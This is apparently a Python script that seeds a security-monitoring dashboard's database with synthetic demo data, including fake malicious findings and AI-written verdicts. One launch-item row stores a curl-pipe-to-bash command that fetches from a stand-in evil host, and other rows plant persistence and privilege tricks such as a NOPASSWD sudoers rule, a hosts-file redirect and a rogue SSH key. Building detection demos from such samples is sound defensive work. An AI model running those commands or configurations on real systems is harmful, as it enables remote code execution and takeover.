#!/usr/bin/env python3
"""Seed the avai database with realistic synthetic data across ALL tables so
the dashboard is fully populated for a demo / dev run — no sudo, no real
system activity, no actual malware. Pure DB inserts.

Usage:
    python tools/seed_demo_db.py [--db ~/avai-local.db]

Intended for a fresh DB (delete the old one first). Idempotent-ish: it
creates the schema if missing and inserts a self-contained snapshot.
"""
from __future__ import annotations

import argparse
import json
import os
from datetime import datetime, timedelta, timezone

from sqlalchemy import create_engine, insert
from sqlalchemy.orm import Session

from avai.enrichers.cache import register_schema
from avai.host_monitor import (
    AuthEventRow,
    Base,
    BluetoothDeviceRow,
    BrowserExtensionRow,
    CollectionRun,
    DnsQueryRow,
    FileIntegrityRow,
    HostsFileRow,
    IncidentNarrativeRow,
    InstalledAppRow,
    Judgement,
    KernelExtensionRow,
    LaunchItemRow,
    ListeningPortRow,
    MdmProfileRow,
    MountRow,
    NetworkConnectionRow,
    NetworkFlowRow,
    NetworkInterfaceRow,
    PrivilegeConfigRow,
    ProcessExecRow,
    ProcessRow,
    QuarantineEventRow,
    RiskScoreRow,
    SetuidFileRow,
    Sink,
    SshAuthorizedKeyRow,
    StreamingSession,
    SystemExtensionRow,
    SystemIntegrityRow,
    UsbDeviceRow,
    WifiStateRow,
)


def _iso(dt: datetime) -> str:
    return dt.replace(microsecond=0).isoformat()


_BULK_NAMES = [
    "Google Chrome",
    "node",
    "python3.11",
    "Slack",
    "zoom.us",
    "Terminal",
    "ssh",
    "curl",
    "bash",
    "mDNSResponder",
    "WindowServer",
    "cfprefsd",
]


def _db_size_bytes(path: str) -> int:
    total = 0
    for suffix in ("", "-wal", "-shm"):
        p = path + suffix
        if os.path.exists(p):
            total += os.path.getsize(p)
    return total


def bulk_fill(engine, db_path: str, target_bytes: int, base_time: datetime) -> int:
    """Insert historical rows across the heavy time-series tables until the DB
    reaches ``target_bytes``. The runs are older than the demo snapshot so the
    'latest run' panels stay clean — this only adds history + volume."""
    hist = []
    with Session(engine) as s:
        for i in range(240):
            st = base_time - timedelta(hours=3) + timedelta(seconds=i * 30)
            rid = f"hist-{i}"
            s.add(
                CollectionRun(
                    run_id=rid,
                    started_at=_iso(st),
                    finished_at=_iso(st + timedelta(seconds=18)),
                    hostname="demo-host.local",
                    collectors_ok=24,
                    collectors_failed=0,
                    lookback_min=6,
                )
            )
            hist.append((rid, _iso(st)))
        s.commit()

    batch = 10000
    it = 0
    while _db_size_bytes(db_path) < target_bytes:
        rid, ts = hist[it % len(hist)]
        procs, auth, conns, dns, execs = [], [], [], [], []
        for j in range(batch):
            nm = _BULK_NAMES[j % len(_BULK_NAMES)]
            procs.append(
                {
                    "run_id": rid,
                    "collected_at": ts,
                    "content_hash": f"hp{it}_{j}",
                    "pid": 1000 + j,
                    "ppid": 1,
                    "name": nm,
                    "exe": f"/usr/bin/{nm}",
                    "cmdline_json": json.dumps([nm, "--opt", str(j)]),
                    "username": "iklo",
                    "cpu_percent": (j % 97) / 3.0,
                    "memory_rss": 5_000_000 + j * 13,
                    "num_threads": 1 + j % 24,
                }
            )
            auth.append(
                {
                    "run_id": rid,
                    "collected_at": ts,
                    "content_hash": f"ha{it}_{j}",
                    "event_timestamp": ts,
                    "process": "sshd" if j % 2 else "sudo",
                    "subsystem": "com.apple.securityd",
                    "category": "auth",
                    "event_type": "failure",
                    "event_message": (
                        f"authentication failure {it}_{j} for demo "
                        f"from 203.0.113.{j % 256}"
                    ),
                    "pid": 900 + j % 500,
                    "raw_json": json.dumps({"seq": j, "blob": "x" * 48}),
                }
            )
            conns.append(
                {
                    "run_id": rid,
                    "collected_at": ts,
                    "content_hash": f"hc{it}_{j}",
                    "pid": 1000 + j,
                    "family": "AF_INET",
                    "type": "SOCK_STREAM",
                    "laddr_ip": "192.168.1.20",
                    "laddr_port": 40000 + j % 20000,
                    "raddr_ip": f"203.0.113.{j % 256}",
                    "raddr_port": 443,
                    "status": "ESTABLISHED",
                }
            )
            dns.append(
                {
                    "run_id": rid,
                    "collected_at": ts,
                    "content_hash": f"hd{it}_{j}",
                    "iface": "en0",
                    "qname": f"host{j}.cdn.example.com",
                    "qtype": "A",
                    "server_ip": "192.168.1.1",
                    "process": nm,
                    "count": 1 + j % 9,
                    "first_seen": ts,
                    "last_seen": ts,
                }
            )
            execs.append(
                {
                    "run_id": rid,
                    "collected_at": ts,
                    "content_hash": f"hx{it}_{j}",
                    "event_timestamp": ts,
                    "event_type": "exec",
                    "pid": 2000 + j,
                    "ppid": 1,
                    "uid": 501,
                    "username": "iklo",
                    "exe_path": f"/usr/bin/{nm}",
                    "exe_args_json": json.dumps([nm, str(j)]),
                    "parent_path": "/bin/zsh",
                    "signing_id": "com.apple.x",
                }
            )
        with engine.begin() as conn:
            conn.execute(insert(ProcessRow), procs)
            conn.execute(insert(AuthEventRow), auth)
            conn.execute(insert(NetworkConnectionRow), conns)
            conn.execute(insert(DnsQueryRow), dns)
            conn.execute(insert(ProcessExecRow), execs)
        it += 1
    return _db_size_bytes(db_path)


def main() -> None:
    ap = argparse.ArgumentParser(description="Seed avai DB with demo data.")
    ap.add_argument("--db", default=os.path.expanduser("~/avai-local.db"))
    ap.add_argument(
        "--target-mb",
        type=float,
        default=0.0,
        help="If >0, bulk-fill historical rows until the DB is at least this "
        "many MB (the demo snapshot stays the latest run).",
    )
    args = ap.parse_args()

    engine = create_engine(
        f"sqlite:///{args.db}", connect_args={"check_same_thread": False}
    )
    sink = Sink(engine)
    sink.setup()  # create_all + register enrichment model + migrate
    EVID = register_schema(Base)

    now = datetime.now(timezone.utc).replace(microsecond=0)
    HOST = "demo-host.local"

    # ---- 6 completed runs (oldest→newest) for the risk sparkline ----
    runs = []  # (run_id, started_iso)
    for k in range(6, 0, -1):
        st = now - timedelta(minutes=4 * k)
        runs.append((f"run-{k}", _iso(st), _iso(st + timedelta(seconds=28))))
    LATEST_RID, LATEST, LATEST_FIN = runs[-1]

    rows: list = []

    for rid, st, fin in runs:
        rows.append(
            CollectionRun(
                run_id=rid,
                started_at=st,
                finished_at=fin,
                hostname=HOST,
                collectors_ok=24,
                collectors_failed=1,
                lookback_min=6,
            )
        )

    def cr(model, ch=None, **f):
        """Collector row tied to the latest run."""
        rows.append(model(run_id=LATEST_RID, collected_at=LATEST, content_hash=ch, **f))

    # ---- processes ----
    cr(
        ProcessRow,
        ch="p_chrome",
        pid=501,
        ppid=1,
        name="Google Chrome",
        exe="/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
        username="iklo",
        cpu_percent=3.4,
        memory_rss=820_000_000,
        num_threads=42,
    )
    cr(
        ProcessRow,
        ch="p_evil",
        pid=66610,
        ppid=931,
        name="x",
        exe="/tmp/.x",
        cmdline_json=json.dumps(["/tmp/.x", "-d"]),
        username="iklo",
        cpu_percent=22.1,
        memory_rss=4_000_000,
        num_threads=3,
    )
    cr(
        ProcessRow,
        ch="p_ssh",
        pid=720,
        ppid=1,
        name="sshd",
        exe="/usr/sbin/sshd",
        username="root",
        cpu_percent=0.0,
        memory_rss=6_000_000,
    )
    cr(ProcessRow, pid=1, ppid=0, name="launchd", exe="/sbin/launchd", username="root")

    # ---- network_connections ----
    cr(
        NetworkConnectionRow,
        pid=501,
        family="AF_INET",
        type="SOCK_STREAM",
        laddr_ip="192.168.1.20",
        laddr_port=51020,
        raddr_ip="142.250.80.46",
        raddr_port=443,
        status="ESTABLISHED",
    )
    cr(
        NetworkConnectionRow,
        ch="nc_evil",
        pid=66610,
        family="AF_INET",
        type="SOCK_STREAM",
        laddr_ip="192.168.1.20",
        laddr_port=51999,
        raddr_ip="9.9.9.9",
        raddr_port=443,
        status="ESTABLISHED",
    )

    # ---- listening_ports ----
    cr(
        ListeningPortRow,
        ch="lp_evil",
        pid=66610,
        process_name="x",
        family="AF_INET",
        type="SOCK_STREAM",
        laddr_ip="0.0.0.0",
        laddr_port=4444,
    )
    cr(
        ListeningPortRow,
        pid=720,
        process_name="sshd",
        family="AF_INET",
        type="SOCK_STREAM",
        laddr_ip="0.0.0.0",
        laddr_port=22,
    )

    # ---- network_flows ----
    cr(
        NetworkFlowRow,
        ch="nf_evil",
        iface="en0",
        proto="tcp",
        dst_ip="9.9.9.9",
        dst_port=443,
        service="https",
        packets=120,
        byte_count=18000,
        process="x",
        pid=66610,
        first_seen=LATEST,
        last_seen=LATEST,
    )
    cr(
        NetworkFlowRow,
        iface="en0",
        proto="tcp",
        dst_ip="142.250.80.46",
        dst_port=443,
        service="https",
        packets=8400,
        byte_count=9_200_000,
        process="Google Chrome",
        pid=501,
        first_seen=LATEST,
        last_seen=LATEST,
    )

    # ---- dns_queries ----
    cr(
        DnsQueryRow,
        ch="dns_evil",
        iface="en0",
        qname="c2-sync.example",
        qtype="A",
        server_ip="192.168.1.1",
        process="x",
        count=37,
        first_seen=LATEST,
        last_seen=LATEST,
    )
    cr(
        DnsQueryRow,
        iface="en0",
        qname="www.google.com",
        qtype="A",
        server_ip="192.168.1.1",
        process="Google Chrome",
        count=12,
        first_seen=LATEST,
        last_seen=LATEST,
    )

    # ---- network_interfaces ----
    cr(
        NetworkInterfaceRow,
        name="en0",
        is_up=True,
        speed_mbps=1000,
        mtu=1500,
        bytes_sent=8_300_000_000,
        bytes_recv=42_000_000_000,
        packets_sent=21_000_000,
        packets_recv=33_000_000,
        addresses_json=json.dumps(["192.168.1.20", "fe80::1"]),
    )
    cr(
        NetworkInterfaceRow,
        name="lo0",
        is_up=True,
        mtu=16384,
        addresses_json=json.dumps(["127.0.0.1", "::1"]),
    )

    # ---- usb_devices ----
    cr(
        UsbDeviceRow,
        name="USB Keyboard",
        vendor_id="05ac",
        product_id="024f",
        manufacturer="Apple Inc.",
        speed="Low Speed",
    )
    cr(
        UsbDeviceRow,
        ch="usb_susp",
        name="USB Mass Storage",
        vendor_id="0781",
        product_id="5567",
        manufacturer="SanDisk",
        serial_number="4C530001",
        speed="High Speed",
    )

    # ---- bluetooth_devices ----
    cr(
        BluetoothDeviceRow,
        name="Magic Mouse",
        address="a4:83:e7:11:22:33",
        connected=True,
        paired=True,
        minor_type="Mouse",
    )
    cr(
        BluetoothDeviceRow,
        ch="bt_susp",
        name="rafaela frare",
        address="00:1a:7d:da:71:13",
        connected=False,
        paired=True,
        minor_type="Keyboard",
    )

    # ---- wifi_state ----
    cr(
        WifiStateRow,
        interface="en0",
        ssid="HomeNet",
        bssid="b4:fb:e4:aa:bb:cc",
        channel=44,
        security="WPA2 Personal",
    )

    # ---- launch_items ----
    cr(
        LaunchItemRow,
        ch="li_evil",
        scope="user_agent",
        path=os.path.expanduser("~/Library/LaunchAgents/com.evil.persist.plist"),
        label="com.evil.persist",
        program="/bin/bash",
        program_arguments_json=json.dumps(
            ["/bin/bash", "-c", "curl -fsSL http://evil.example/i.sh | bash"]
        ),
        run_at_load=True,
        keep_alive=True,
        user_name="iklo",
    )
    cr(
        LaunchItemRow,
        scope="system_daemon",
        path="/Library/LaunchDaemons/com.apple.x.plist",
        label="com.apple.x",
        program="/usr/libexec/x",
        run_at_load=True,
    )

    # ---- quarantine_events ----
    cr(
        QuarantineEventRow,
        ch="q_susp",
        event_id="A1B2",
        timestamp=1717000000.0,
        agent_bundle_id="com.apple.Safari",
        agent_name="Safari",
        origin_url="http://free-downloads.example/installer.dmg",
        data_url="http://cdn.example/installer.dmg",
        type_number=0,
    )

    # ---- browser_extensions ----
    cr(
        BrowserExtensionRow,
        ch="be_susp",
        browser="chrome",
        profile="Default",
        extension_id="aaaabbbbccccddddeeeeffff",
        name="Coupon Saver",
        version="3.1",
        permissions_json=json.dumps(["tabs", "webRequest", "cookies", "<all_urls>"]),
        host_permissions_json=json.dumps(["<all_urls>"]),
    )
    cr(
        BrowserExtensionRow,
        browser="chrome",
        profile="Default",
        extension_id="cjpalhdlnbpafiamejdnhcphjbkeiagm",
        name="uBlock Origin",
        version="1.57",
        permissions_json=json.dumps(["storage"]),
    )

    # ---- system_integrity (firewall OFF + SSH ON → drives risk drivers) ----
    cr(
        SystemIntegrityRow,
        filevault_active=True,
        firewall_global_state=0,
        firewall_stealth=False,
        gatekeeper_assessments_enabled=True,
        remote_login_enabled=True,
        screen_sharing_enabled=False,
        remote_management_enabled=False,
    )

    # ---- file_integrity ----
    cr(
        FileIntegrityRow,
        ch="fi_susp",
        path=os.path.expanduser("~/.zshrc"),
        sha256="a" * 64,
        size=4200,
        mode=0o644,
        uid=501,
        gid=20,
        exists_flag=1,
    )
    cr(
        FileIntegrityRow,
        path="/etc/ssh/sshd_config",
        sha256="b" * 64,
        size=3200,
        mode=0o644,
        uid=0,
        gid=0,
        exists_flag=1,
    )

    # ---- installed_apps ----
    cr(
        InstalledAppRow,
        path="/Applications/Google Chrome.app",
        bundle_id="com.google.Chrome",
        name="Google Chrome",
        version="120.0.6099",
    )
    cr(
        InstalledAppRow,
        path="/usr/bin/openssl",
        bundle_id="org.openssl",
        name="openssl",
        version="3.0.2",
    )
    cr(InstalledAppRow, path="/usr/bin/curl", name="libcurl", version="7.88.0")

    # ---- process_exec_events ----
    cr(
        ProcessExecRow,
        ch="px_evil",
        event_timestamp=LATEST,
        event_type="exec",
        pid=66610,
        ppid=931,
        uid=501,
        username="iklo",
        exe_path="/tmp/.x",
        exe_args_json=json.dumps(["/tmp/.x", "-d"]),
        parent_path="/bin/zsh",
        signing_id=None,
    )
    cr(
        ProcessExecRow,
        event_timestamp=LATEST,
        event_type="exec",
        pid=940,
        ppid=1,
        uid=0,
        username="root",
        exe_path="/usr/sbin/cron",
        parent_path="/sbin/launchd",
        signing_id="com.apple.cron",
    )

    # ---- mounts ----
    cr(
        MountRow,
        device="/dev/disk3s1s1",
        mountpoint="/",
        fstype="apfs",
        opts="ro,journaled",
    )
    cr(
        MountRow,
        device="/dev/disk3s5",
        mountpoint="/System/Volumes/Data",
        fstype="apfs",
        opts="rw,journaled",
    )

    # ---- setuid_files ----
    cr(
        SetuidFileRow,
        path="/usr/bin/sudo",
        mode=0o4555,
        uid=0,
        gid=0,
        size=1_400_000,
        setuid=True,
        setgid=False,
        sha256="c" * 64,
    )
    cr(
        SetuidFileRow,
        ch="su_susp",
        path="/usr/local/bin/helper",
        mode=0o4755,
        uid=0,
        gid=0,
        size=22000,
        setuid=True,
        setgid=False,
        sha256="d" * 64,
    )

    # ---- mdm_profiles ----
    cr(
        MdmProfileRow,
        identifier="com.example.mdm",
        display_name="Corp MDM",
        organization="Example Corp",
        profile_scope="System",
        is_supervised=True,
    )

    # ---- kernel_extensions ----
    cr(
        KernelExtensionRow,
        bundle_id="com.apple.iokit.IOHIDFamily",
        name="IOHIDFamily",
        version="2.0.0",
        path="/System/Library/Extensions",
        team_id=None,
        signing_id="com.apple.iokit.IOHIDFamily",
    )

    # ---- system_extensions ----
    cr(
        SystemExtensionRow,
        bundle_id="com.cloudflare.warp.extension",
        team_id="68WVV388M8",
        version="2024.1",
        state="activated_enabled",
        categories="network-extension",
    )

    # ---- ssh_authorized_keys ----
    cr(
        SshAuthorizedKeyRow,
        ch="ssh_susp",
        path=os.path.expanduser("~/.ssh/authorized_keys"),
        owner="iklo",
        key_type="ssh-ed25519",
        fingerprint="SHA256:Zk3...",
        comment="root@kali",
    )

    # ---- hosts_file ----
    cr(
        HostsFileRow,
        ch="hosts_susp",
        source_path="/etc/hosts",
        ip="127.0.0.1",
        hostnames="login.bank-of-example.com",
    )
    cr(HostsFileRow, source_path="/etc/hosts", ip="127.0.0.1", hostnames="localhost")

    # ---- privilege_config ----
    cr(
        PrivilegeConfigRow,
        ch="priv_susp",
        kind="sudoers",
        subject="iklo",
        detail="iklo ALL=(ALL) NOPASSWD: ALL",
        source_path="/etc/sudoers.d/iklo",
    )
    cr(
        PrivilegeConfigRow,
        kind="account",
        subject="root",
        detail="uid=0",
        source_path="/etc/passwd",
    )

    # ---- auth_events (streaming) ----
    cr(
        AuthEventRow,
        event_timestamp=LATEST,
        process="sudo",
        subsystem="com.apple.securityd",
        category="auth",
        event_type="failure",
        event_message="authentication failure for iklo",
        pid=940,
    )
    cr(
        AuthEventRow,
        event_timestamp=LATEST,
        process="sshd",
        subsystem="com.apple.securityd",
        category="auth",
        event_type="failure",
        event_message="Failed password for invalid user admin",
        pid=720,
    )

    # ---- streaming sessions ----
    rows.append(
        StreamingSession(
            run_id="sess-auth",
            collector="auth_events",
            hostname=HOST,
            started_at=LATEST,
            finished_at=None,
            row_count=574,
        )
    )
    rows.append(
        StreamingSession(
            run_id="sess-exec",
            collector="process_exec_events",
            hostname=HOST,
            started_at=LATEST,
            finished_at=None,
            row_count=88,
        )
    )

    # ---- judgements (link to collector rows by content_hash) ----
    def judge(
        ch,
        collector,
        verdict,
        category,
        conf,
        reason,
        fix,
        novel=None,
        ctx=None,
        cost=0.00009,
    ):
        rows.append(
            Judgement(
                content_hash=ch,
                collector=collector,
                verdict=verdict,
                category=category,
                confidence=conf,
                reasoning=reason,
                remediation=fix,
                model="claude-haiku-4-5-20251001",
                created_at=LATEST,
                last_seen_at=LATEST,
                novel=novel,
                context_json=json.dumps(ctx) if ctx else None,
                cost_usd=cost,
            )
        )

    proc_ctx = {
        "baseline": {
            "novel": True,
            "first_seen": LATEST,
            "times_seen": 1,
            "host_runs": 6,
            "baseline_established": True,
        },
        "related": {
            "listening_ports": ["0.0.0.0:4444"],
            "outbound_flows": [
                {"dst": "9.9.9.9:443", "service": "https", "packets": 120}
            ],
            "remote_connections": ["9.9.9.9:443 ESTABLISHED"],
            "dns_queries": ["c2-sync.example (A)"],
            "exec_lineage": {"parent": "/bin/zsh", "signed": None, "exe": "/tmp/.x"},
        },
    }
    judge(
        "p_evil",
        "processes",
        "malicious",
        "execution",
        0.94,
        "Unsigned binary in /tmp with high CPU, beaconing to a flagged IP.",
        "Kill pid 66610; rm /tmp/.x; investigate parent shell.",
        novel=1,
        ctx=proc_ctx,
        cost=0.00021,
    )
    judge(
        "p_chrome",
        "processes",
        "benign",
        "none",
        0.98,
        "Signed mainstream browser.",
        "",
    )
    judge(
        "li_evil",
        "launch_items",
        "malicious",
        "persistence",
        0.92,
        "LaunchAgent runs curl|bash at load — classic persistence.",
        "launchctl unload ~/Library/LaunchAgents/com.evil.persist.plist; delete the plist.",
        novel=1,
        cost=0.00015,
    )
    judge(
        "nf_evil",
        "network_flows",
        "suspicious",
        "command_and_control",
        0.8,
        "Steady low-volume beacon to 9.9.9.9:443 from /tmp binary.",
        "Block 9.9.9.9; correlate with pid 66610.",
        cost=0.00011,
    )
    judge(
        "dns_evil",
        "dns_queries",
        "malicious",
        "command_and_control",
        0.85,
        "Repeated lookups of c2-sync.example (likely C2).",
        "Sinkhole the domain; inspect the querying process.",
        cost=0.00010,
    )
    judge(
        "lp_evil",
        "listening_ports",
        "suspicious",
        "command_and_control",
        0.7,
        "Unsigned binary listening on 0.0.0.0:4444.",
        "Close the port; terminate pid 66610.",
        cost=0.00008,
    )
    judge(
        "hosts_susp",
        "hosts_file",
        "suspicious",
        "defense_evasion",
        0.78,
        "Bank login domain pointed at 127.0.0.1 (possible phishing/MITM).",
        "Remove the /etc/hosts override.",
        cost=0.00007,
    )
    judge(
        "priv_susp",
        "privilege_config",
        "suspicious",
        "privilege_escalation",
        0.72,
        "NOPASSWD ALL sudoers rule for a non-admin user.",
        "Remove /etc/sudoers.d/iklo or scope it tightly.",
        cost=0.00007,
    )
    judge(
        "ssh_susp",
        "ssh_authorized_keys",
        "suspicious",
        "persistence",
        0.74,
        "Authorized key with 'root@kali' comment.",
        "Remove the unknown key from ~/.ssh/authorized_keys.",
        cost=0.00006,
    )
    judge(
        "be_susp",
        "browser_extensions",
        "suspicious",
        "collection",
        0.66,
        "Extension requests <all_urls> + webRequest + cookies.",
        "Review/remove the extension at chrome://extensions.",
        cost=0.00006,
    )

    # ---- risk scores (sparkline + drivers) ----
    scores = [88, 85, 80, 78, 72, 60]
    drivers = [
        {"label": "Firewall off", "points": 15},
        {"label": "Remote login (SSH) enabled", "points": 10},
        {"label": "2 active malicious finding(s)", "points": 40},
        {"label": "4 active suspicious finding(s)", "points": 24},
        {"label": "1 NOPASSWD sudoers rule(s)", "points": 10},
    ]
    prev = None
    for (rid, st, _fin), sc in zip(runs, scores):
        grade = (
            "A"
            if sc >= 90
            else "B" if sc >= 80 else "C" if sc >= 70 else "D" if sc >= 60 else "F"
        )
        last = rid == LATEST_RID
        rows.append(
            RiskScoreRow(
                created_at=st,
                run_id=rid,
                score=sc,
                grade=grade,
                prev_score=prev,
                drivers_json=json.dumps(drivers if last else drivers[:2]),
                explanation=(
                    "Score down 12. New: 2 active malicious finding(s); "
                    "4 active suspicious finding(s)."
                    if last
                    else "Posture drift."
                ),
            )
        )
        prev = sc

    # ---- incident narrative (structured) ----
    rows.append(
        IncidentNarrativeRow(
            created_at=LATEST,
            run_id=LATEST_RID,
            model="claude-haiku-4-5-20251001",
            severity="critical",
            headline="Unsigned /tmp binary beaconing to a flagged IP with LaunchAgent persistence",
            summary=(
                "A novel unsigned binary (/tmp/.x) is beaconing to 9.9.9.9 and "
                "resolving a C2 domain, with a curl|bash LaunchAgent installed for persistence."
            ),
            timeline_json=json.dumps(
                [
                    {
                        "time": LATEST,
                        "title": "Unsigned binary /tmp/.x executed",
                        "category": "execution",
                        "detail": "Spawned by /bin/zsh; high CPU.",
                    },
                    {
                        "time": LATEST,
                        "title": "LaunchAgent com.evil.persist added",
                        "category": "persistence",
                        "detail": "RunAtLoad curl|bash.",
                    },
                    {
                        "time": LATEST,
                        "title": "Beacon to 9.9.9.9:443 + c2-sync.example",
                        "category": "command_and_control",
                        "detail": "Steady low-volume flow.",
                    },
                ]
            ),
            actions_json=json.dumps(
                [
                    {
                        "priority": "immediate",
                        "title": "Kill and remove the binary",
                        "command": "kill 66610 && rm -f /tmp/.x",
                        "detail": "Stop the beacon.",
                    },
                    {
                        "priority": "immediate",
                        "title": "Remove persistence",
                        "command": "launchctl unload ~/Library/LaunchAgents/com.evil.persist.plist",
                        "detail": "Then delete the plist.",
                    },
                    {
                        "priority": "high",
                        "title": "Block the C2 destination",
                        "command": "",
                        "detail": "Block 9.9.9.9 and sinkhole c2-sync.example.",
                    },
                ]
            ),
            finding_count=6,
            finding_hashes=json.dumps(
                sorted(
                    [
                        "p_evil",
                        "li_evil",
                        "nf_evil",
                        "dns_evil",
                        "lp_evil",
                        "hosts_susp",
                    ]
                )
            ),
        )
    )

    # ---- enrichment_evidence (Vulnerabilities panel + forward-chained CVEs) ----
    def evid(source, itype, value, hint, conf, summary, details):
        rows.append(
            EVID(
                source=source,
                indicator_type=itype,
                indicator_value=value,
                verdict_hint=hint,
                confidence=conf,
                summary=summary,
                details_json=json.dumps(details),
                fetched_at=LATEST,
            )
        )

    evid(
        "osv",
        "package",
        "openssl@3.0.2",
        "suspicious",
        0.75,
        "OSV: 1 advisory hit(s): CVE-2024-0001",
        {"vuln_ids": ["CVE-2024-0001"]},
    )
    evid(
        "osv",
        "package",
        "libcurl@7.88.0",
        "suspicious",
        0.75,
        "OSV: 1 advisory hit(s): CVE-2023-38545",
        {"vuln_ids": ["CVE-2023-38545"]},
    )
    evid(
        "nvd",
        "cve",
        "CVE-2024-0001",
        "malicious",
        0.7,
        "NVD: CVSS=9.8 CRITICAL — heap overflow",
        {"cvss31": {"baseScore": 9.8, "baseSeverity": "CRITICAL"}},
    )
    evid(
        "nvd",
        "cve",
        "CVE-2023-38545",
        "malicious",
        0.7,
        "NVD: CVSS=9.8 CRITICAL — SOCKS5 heap buffer overflow",
        {"cvss31": {"baseScore": 9.8, "baseSeverity": "CRITICAL"}},
    )
    evid(
        "cisa_kev",
        "cve",
        "CVE-2023-38545",
        "malicious",
        0.98,
        "CISA KEV: actively exploited",
        {"knownRansomwareCampaignUse": "Unknown"},
    )
    evid(
        "github_advisory",
        "cve",
        "CVE-2024-0001",
        "malicious",
        0.9,
        "GH Advisory: severity=critical",
        {"severity": "critical", "cvss": {"score": 9.8}},
    )
    evid(
        "endoflife",
        "os_version",
        "macos@12",
        "suspicious",
        0.6,
        "macOS 12 is end-of-life — no security updates.",
        {"eol": True},
    )

    with Session(engine) as s:
        s.add_all(rows)
        s.commit()

    # ---- optional bulk fill to reach a target on-disk size ----
    if args.target_mb > 0:
        target = int(args.target_mb * 1024 * 1024)
        print(f"bulk-filling to >= {args.target_mb:.0f} MB …")
        size = bulk_fill(engine, args.db, target, now)
        print(f"  reached {size / 1024 / 1024:.1f} MB")

    # ---- summary ----
    import sqlite3

    con = sqlite3.connect(args.db)
    print(f"seeded {args.db} ({_db_size_bytes(args.db) / 1024 / 1024:.1f} MB)")
    for t in (
        "collection_runs",
        "judgements",
        "incident_narratives",
        "risk_scores",
        "enrichment_evidence",
    ):
        n = con.execute(f"select count(*) from {t}").fetchone()[0]
        print(f"  {n:>4}  {t}")
    print("done — start the dashboard to view.")


if __name__ == "__main__":
    main()
